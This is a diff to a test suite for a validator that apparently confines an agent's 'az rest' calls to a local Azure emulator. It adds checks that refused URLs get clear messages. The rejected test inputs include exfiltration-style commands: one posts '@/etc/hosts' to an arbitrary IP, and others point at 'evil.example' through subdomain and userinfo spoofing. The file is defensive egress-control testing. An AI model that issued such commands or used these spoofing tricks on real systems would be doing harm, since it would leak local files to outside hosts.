@@ -124,7 +124,7 @@ describe("evaluateAzCommand", () => {
     expect(allowed("rest -u https://management.azure.com").argv[2]).toBe("/");
   });
 
-  test("rest calls local hosts only: a file given as the body would go wherever the URL points", () => {
+  test("rest reaches only the emulator: a file given as the body would go wherever the URL points", () => {
     for (const command of [
       "rest --method post --url http://10.1.2.3:8080/x --body @/etc/hosts",
       "rest --uri=HTTP://evil.example/x",
@@ -134,12 +134,31 @@ describe("evaluateAzCommand", () => {
       "rest --url https://management.azure.com.evil.example/x",
       "rest --url https://localhost@evil.example/x",
     ]) {
-      expect(refusal(command).title).toBe("URL not allowed");
+      expect(refusal(command).message).toContain("is not the emulator");
     }
+    // Plain http is refused by the egress guard, and the emulator's certificate does not cover
+    // localhost or 127.0.0.1, so only https on its own names gets through.
+    for (const command of [
+      "rest --url http://localhost:4566/_localstack/health",
+      "rest --url http://127.0.0.1:2375/version",
+      "rest --url https://localhost:4566/subscriptions?api-version=2021-04-01",
+      "rest --url https://127.0.0.1:4566/x",
+      "rest --url http://azure.localhost.localstack.cloud:4566/x",
+    ]) {
+      const { message } = refusal(command);
+      expect(message).toContain("fails az's certificate check or the egress guard");
+      expect(message).toContain("`https://azure.localhost.localstack.cloud:4566`");
+    }
+    // The configured endpoint, so the agent gets a URL it can use as is.
+    const onPort = evaluateAzCommand("rest --url https://localhost:4567/x", {
+      endpoint: "https://azure.localhost.localstack.cloud:4567",
+    });
+    expect(!onPort.ok && onPort.message).toContain(
+      "or one on `https://azure.localhost.localstack.cloud:4567`."
+    );
     for (const url of [
       "https://azure.localhost.localstack.cloud:4566/x",
-      "http://localhost:4566/_localstack/health",
-      "http://127.0.0.1:4566/x",
+      "https://localhost.localstack.cloud:4566/x",
       "/subscriptions?api-version=2022-12-01",
       "//evil.example/x", // no scheme: az puts the emulator's endpoint before it
     ]) {
